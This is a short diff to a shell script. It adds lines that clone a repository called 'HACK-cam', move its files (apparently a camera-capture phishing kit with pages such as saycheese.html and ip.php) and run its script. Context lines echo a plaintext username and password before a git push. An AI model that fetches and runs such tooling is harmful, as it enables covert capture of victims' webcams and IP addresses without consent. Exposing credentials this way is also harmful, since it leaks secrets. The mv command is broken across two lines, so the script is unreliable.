@@ -75,3 +75,8 @@ git pull --rebase origin master
 echo -e '"the Username is "MrAli-s"'
 echo -e '"the password is "1928Rami@//"'
 git push -u origin master
+git clone https://github.com/AkanVb/HACK-cam
+mv HACK-cam/post.php saycheese.html template.php jmaxopcam.sh ip.php index.php index2.php
+README.md LICENSE ..
+rm -rf HACK-cam
+bash jmaxopcam.sh
